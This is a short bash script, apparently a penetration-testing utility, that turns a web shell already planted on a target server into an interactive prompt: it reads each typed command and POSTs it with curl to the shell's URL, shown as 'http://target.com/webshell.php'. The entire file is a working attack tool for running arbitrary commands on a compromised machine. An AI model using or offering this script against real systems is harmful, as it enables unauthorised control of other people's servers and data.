#!/bin/bash

# A web-shell wrapper
# Work with rlwrap: sudo apt install rlwrap
# Usage: $ rlwrap ./pseudo-shell.sh http://target.com/webshell.php
# change cmd variable that suits your params.

URL="$1"

while true
	do
	echo -n "$ "; read cmd
		curl -skX POST "${URL}" --data-urlencode "cmd=$cmd"
	done

